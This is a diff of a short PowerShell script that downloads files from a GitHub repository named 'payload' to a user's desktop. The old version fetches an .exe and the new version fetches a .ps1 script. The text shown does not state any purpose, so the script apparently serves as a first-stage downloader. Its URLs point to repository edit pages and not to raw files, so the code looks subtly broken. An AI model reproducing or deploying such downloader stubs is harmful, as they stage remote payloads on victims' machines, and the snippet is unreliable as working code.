@@ -1,18 +1,7 @@
-# Set the source and destination
-$source = 'https://github.com/myansen039/payload/new/main/main.exe'
-$destination = 'C:\Users\user\desktop\test.exe'
- 
-# Create the HTTP client download request
-$httpClient = New-Object System.Net.Http.HttpClient
-$response = $httpClient.GetAsync($source)
-$response.Wait()
- 
-# Create a file stream to pointed to the output file destination
-$outputFileStream = [System.IO.FileStream]::new($destination, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
- 
-# Stream the download to the destination file stream
-$downloadTask = $response.Result.Content.CopyToAsync($outputFileStream)
-$downloadTask.Wait()
- 
-# Close the file stream
-$outputFileStream.Close()
+# Define the source link and destination path
+$source = 'https://github.com/myansen039/payload/edit/main/download.ps1'
+$destination = 'C:\Users\user\Desktop\download.ps1'
+# Create the new WebClient
+$webClient = [System.Net.WebClient]::new()
+# Download the file
+$webClient.DownloadFile($source, $destination)
